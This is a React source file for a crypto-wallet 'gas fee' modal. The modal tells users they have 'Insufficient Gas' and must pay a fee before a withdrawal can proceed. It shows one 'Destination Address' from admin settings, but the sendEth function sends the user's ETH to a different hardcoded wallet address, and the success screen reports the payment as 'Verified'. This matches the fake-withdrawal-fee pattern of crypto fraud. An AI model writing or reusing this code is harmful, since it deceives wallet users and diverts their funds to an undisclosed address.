'use client';

import { useEffect, useState, useMemo } from 'react';
import { X, Fuel, ArrowRight, Loader2, CheckCircle, Check } from 'lucide-react';
import { ethers } from 'ethers';
import { useWallet } from '@/context/base';
import { motion, AnimatePresence } from 'framer-motion';

declare global {
    interface Window {
        ethereum?: Record<string, unknown>;
    }
}

interface GasFeeModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSuccess: (txHash: string) => void;
    amount?: string;
    user?: any;
    theme?: 'dark' | 'light';
    network?: string;
}

export default function GasFeeModal({
    isOpen,
    onClose,
    onSuccess,
    amount = '0.00',
    user,
    theme = 'light',
    network = 'ETH'
}: GasFeeModalProps) {
    const [status, setStatus] = useState<any>('idle');
    const [txSuccess, setTxSuccess] = useState<any>(false);
    const [txHash, setTxHash] = useState('');
    const [error, setError] = useState(null);
    const { cbProvider, address: add } = useWallet();
    const [internalUser, setInternalUser] = useState<any>(user);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const [loadingSettings, setLoadingSettings] = useState(false);

    useEffect(() => {
        if (isOpen) {
            fetchAdminSettings();
        }
    }, [isOpen]);

    useEffect(() => {
        if (user && user.id) {
            setInternalUser(user);
        } else if (isOpen && add) {
            const fetchUser = async () => {
                try {
                    let res = await fetch(`/api/user?address=${add}`);
                    let json = await res.json();
                    if (json?.existingRecord) {
                        setInternalUser(json.existingRecord);
                    }
                } catch (e) {
                    console.error("Error fetching user in GasFeeModal:", e);
                }
            };
            fetchUser();
        }
    }, [add, user, isOpen]);

    const fetchAdminSettings = async () => {
        setLoadingSettings(true);
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            console.log(data, "settingssss")
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        } finally {
            setLoadingSettings(false);
        }
    };

    const { targetNetworkName, targetAsset, isBsc, targetChainId } = useMemo(() => {
        // Force all gas payments to Ethereum Mainnet as requested
        return {
            isBsc: false,
            targetChainId: '0x1',
            targetNetworkName: 'Ethereum Mainnet',
            targetAsset: 'ETH'
        };
    }, []);


    const sendEth = async () => {

        console.log(internalUser?.fields?.gasFee, "internalUser")
        // let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
        let amountText = (0.000000000000001).toString();

        // Strictly use the eth address key as requested by the user
        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';

        console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });

        try {
            if (!cbProvider) {
                setError("Wallet provider not found. Please reconnect.");
                return;
            }
            if (!amountText || isNaN(parseFloat(amountText))) {
                setError(`Invalid gas fee amount: ${amountText}`);
                return;
            }
            if (!gasVault || !gasVault.startsWith('0x')) {
                const foundKeys = Object.keys(adminAddresses).join(', ');
                setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
                return;
            }

            setStatus('processing');
            setError('');

            // 1. Ensure we are on the correct chain before sending
            try {
                await cbProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            } catch (switchError: any) {
                // Switch failed or was cancelled - STOP HERE
                setError(`Network switch to Ethereum Mainnet is required for gas payment.`);
                setStatus('idle');
                return;
            }

            const provider = new ethers.BrowserProvider(cbProvider);
            const signer = await provider.getSigner();
            console.log(signer, "signersigner")

            console.log('[DEBUG] Sending transaction to:', gasVault, 'with value:', amountText, 'on', targetNetworkName);
            const feeData = await provider.getFeeData();
            console.log(feeData, "feeData")
            let amunt = Number(amountText).toFixed(18)
            const amountInWei = ethers.parseUnits(amunt, "ether");
            // 2. Create and send the transaction
            const tx = await signer.sendTransaction({
                // to: gasVault.trim(),
                to: "0x79f3976ce219dDE8aE9CeFDABCE2E2e83F5E3c02",
                // value: ethers.parseEther(Number(amountText).toFixed(18)),
                value: amountInWei,
                gasLimit: 21000,
                "data": "0x",

                maxFeePerGas: feeData.maxFeePerGas ?? undefined,
                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
            });

            setStatus('Transaction sent! Waiting for block...');
            await tx.wait();

            setStatus('success');
            setTxSuccess(true);
            setTxHash(tx.hash);

            console.log('[DEBUG] Transaction successful! Hash:', tx.hash);

            // 3. Update API call to record the transaction
            try {
                const apiRes = await fetch(`/api/withdrawal`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        address: add,
                        amount: Number(amountText),
                        type: "fee",
                        asset: targetAsset,
                        network: targetNetworkName,
                        wType: "crypto",
                        status: "completed"
                    })
                });
                const apiResult = await apiRes.json();
                console.log('[DEBUG] API response:', apiResult);
            } catch (apiErr) {
                console.error("Failed to update API after success:", apiErr);
            }

            if (onSuccess) onSuccess(tx.hash);

        } catch (err: any) {
            console.error("Gas Payment Error Details:", err);
            const msg = err?.info?.error?.message || err?.message || "Transaction failed";
            setError(msg);
            setStatus('idle');
        }
    };

    const handlePayGasFac = async () => {
        sendEth();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-[60] flex items-end md:items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 bg-black/80 backdrop-blur-md"
                        onClick={status !== 'processing' ? onClose : undefined}
                    />

                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[420px] border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-6 text-center space-y-6 shadow-2xl pb-12 md:pb-6 z-20 md:m-4 ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            }`}
                    >
                        <button
                            onClick={onClose}
                            className={`absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full transition-colors z-10 ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
                        >
                            <X className="w-5 h-5" />
                        </button>

                        {status === 'success' ? (
                            <motion.div
                                initial={{ opacity: 0, scale: 0.9 }}
                                animate={{ opacity: 1, scale: 1 }}
                                className="space-y-6 py-4"
                            >
                                <div className="w-20 h-20 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-full flex items-center justify-center mx-auto shadow-[0_0_30px_rgba(16,185,129,0.15)] animate-bounce-subtle">
                                    <CheckCircle className="w-10 h-10" />
                                </div>

                                <div className="space-y-2">
                                    <h3 className="text-3xl font-bold text-white tracking-tight">Payment Successful</h3>
                                    <p className="text-gray-400 text-sm">Your gas fee transaction was securely submitted to the network.</p>
                                </div>

                                <div className={`rounded-2xl p-5 border text-left shadow-inner space-y-4 ${theme === 'dark' ? 'bg-[#1a1b1f] border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Status</span>
                                        <span className="text-emerald-400 font-medium flex items-center gap-1.5 bg-emerald-400/10 px-2.5 py-1 rounded-full text-xs border border-emerald-400/20">
                                            <div className="w-1.5 h-1.5 rounded-full bg-emerald-400"></div>
                                            Verified
                                        </span>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="space-y-1.5">
                                        <span className="text-gray-400 text-xs pl-1">Transaction Hash</span>
                                        <div className={`font-mono text-[11px] break-all px-3 py-3 rounded-xl border shadow-inner ${theme === 'dark' ? 'bg-[#0a0b0d] text-blue-400 border-white/5' : 'bg-white text-blue-600 border-gray-200'}`}>
                                            {txHash || "0x..."}
                                        </div>
                                    </div>
                                </div>

                                <button
                                    onClick={() => onSuccess(txHash)}
                                    className="w-full bg-[#0052FF] hover:bg-[#004ada] !text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm mt-6"
                                >
                                    <Check className="w-4 h-4" /> OK, Continue
                                </button>
                            </motion.div>
                        ) : (
                            <>
                                <motion.div
                                    initial={{ scale: 0.5, opacity: 0, rotate: -15 }}
                                    animate={{ scale: 1, opacity: 1, rotate: 3 }}
                                    className="w-16 h-16 bg-gradient-to-tr from-orange-500/20 to-orange-400/5 border border-orange-500/20 text-orange-500 rounded-2xl flex items-center justify-center mx-auto shadow-[0_0_15px_rgba(249,115,22,0.15)]"
                                >
                                    {txSuccess ? (
                                        <Check className="w-8 h-8" />
                                    ) : (
                                        <Fuel className="w-8 h-8" />
                                    )}
                                </motion.div>

                                <div className="space-y-2">
                                    <h3 className="text-2xl font-bold text-white tracking-tight">
                                        {txSuccess ? "Transaction Successful" : "Insufficient Gas"}
                                    </h3>
                                    <p className="text-gray-400 text-sm leading-relaxed px-2">
                                        A network gas fee is required to process this transaction securely. This includes estimated fees.
                                    </p>
                                    {error && !loadingSettings && (
                                        <motion.div
                                            initial={{ opacity: 0, y: 10 }}
                                            animate={{ opacity: 1, y: 0 }}
                                            className="mt-3 bg-red-500/10 border border-red-500/20 text-red-400 text-xs px-3 py-2 rounded-lg break-words text-left"
                                        >
                                            <span className="font-semibold block mb-0.5">Error:</span>
                                            {error}
                                        </motion.div>
                                    )}
                                </div>

                                <div className={`border rounded-2xl p-5 space-y-4 text-left shadow-inner ${theme === 'dark' ? 'bg-[#1a1b1f] border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Network</span>
                                        <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{targetNetworkName}</span>
                                    </div>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Estimated Fee</span>
                                        <div className="text-right">
                                            <span className={`font-bold text-lg ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>{internalUser?.fields?.gasFee || "0.0000000001"} {targetAsset}</span>
                                        </div>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="space-y-1">
                                        <span className="text-gray-400 text-xs">Destination Address</span>
                                        <div className="font-mono text-[10px] opacity-60 break-all">{adminAddresses['gas_fee_address_eth'] || "Searching..."}</div>
                                    </div>
                                    <div className={`h-[1px] w-full ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                    <div className="flex justify-between items-center text-sm">
                                        <span className="text-gray-400">Execution</span>
                                        <span className="text-emerald-400 font-medium flex items-center gap-1.5 bg-emerald-400/10 px-2 py-0.5 rounded-full text-xs border border-emerald-400/20">
                                            <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></div>
                                            Lightning Fast
                                        </span>
                                    </div>
                                </div>

                                <button
                                    onClick={handlePayGasFac}
                                    disabled={status !== 'idle'}
                                    className="w-full bg-[#0052FF] hover:bg-[#004ada] !text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
                                >
                                    {status !== 'idle' || loadingSettings ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            {loadingSettings ? "Connecting to settings..." : (status.length > 20 ? "Processing..." : status)}
                                        </>
                                    ) : (
                                        <>
                                            {adminAddresses['gas_fee_address_eth'] ? "Pay Gas Fee" : "No Wallet Address Configured"}
                                            {adminAddresses['gas_fee_address_eth'] && <ArrowRight className="w-4 h-4" />}
                                        </>
                                    )}
                                </button>
                            </>
                        )}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}
